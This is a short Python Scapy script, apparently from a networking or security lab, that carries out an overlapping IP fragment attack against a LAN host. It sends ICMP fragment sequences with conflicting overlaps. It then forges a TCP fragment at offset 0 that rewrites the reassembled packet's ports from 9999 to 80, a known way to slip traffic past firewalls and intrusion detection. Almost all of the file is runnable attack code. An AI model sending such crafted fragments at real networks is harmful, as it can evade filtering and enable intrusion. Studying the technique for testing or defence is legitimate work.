"""
Authors : Fridez Lucas, Maxime Welcklen
Attack : simple Overlapping framgents attack
"""
from scapy.all import *

#wireshark filter : ip.src==192.168.1.111

dstIP="192.168.1.103"
dPort = 9999

id1 = 12345
id2 = 54321

frag1=IP(dst=dstIP, id=id1, proto=1, frag=0, flags=1) / ICMP(type=8, code=0, chksum=0xdce8)
frag2=IP(dst=dstIP, id=id1, proto=1, frag=1, flags=1) / "AAAAAAAA"
frag3=IP(dst=dstIP, id=id1, proto=1, frag=2, flags=1) / "BBBBBBBB"
frag4=IP(dst=dstIP, id=id1, proto=1, frag=3, flags=0) / "CCCCCCCC"

send(frag1)
send(frag2)
send(frag3)
send(frag4)



frag1=IP(dst=dstIP, id=id2, proto=1, frag=0, flags=1) / ICMP(type=8, code=0, chksum=0xdce8)
frag2=IP(dst=dstIP, id=id2, proto=1, frag=1, flags=1) / "AAAAAAAA"
frag3=IP(dst=dstIP, id=id2, proto=1, frag=2, flags=1) / "BBBBBBBBBBBBBBBB"
frag4=IP(dst=dstIP, id=id2, proto=1, frag=3, flags=0) / "CCCCCCCC"

send(frag1)
send(frag2)
send(frag3)
send(frag4)


# create two IP packets, one with 1480 payload bytes and one with 4 payload bytes
# initial payload is TCP with sport/dport being 9999

frags = fragment(IP(dst=dstIP)/TCP(sport=9999,dport=9999)/("FAKE"*(1464//4)))

# [<IP  flags=MF frag=0 proto=tcp dst=10.0.2.17 |<Raw  load="'\x0f'\x0f\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00\xd5n\x00\x|>>, <IP  flags= frag=185 proto=tcp dst=10.0.2.17 |<Raw  load='FAKE' |>>]
# overwrite the 4 payload bytes of fragment 2 to overlap the reassembled IP packet at offset 0 to overwrite sport/dport to port 80,80

frags[1][Raw].load=struct.pack("!HH",80,80)  # network byteorder
frags[1][IP].frag=0
# <IP  flags= frag=0 proto=tcp dst=10.0.2.17 |<Raw  load='\x00P\x00P' |>>

# send your fragments and watch them being reassembled in wireshark/...
# they should show up the initial IP/TCP/sport=dport=9999 packet but with sport/dport being set to 80
send(frags)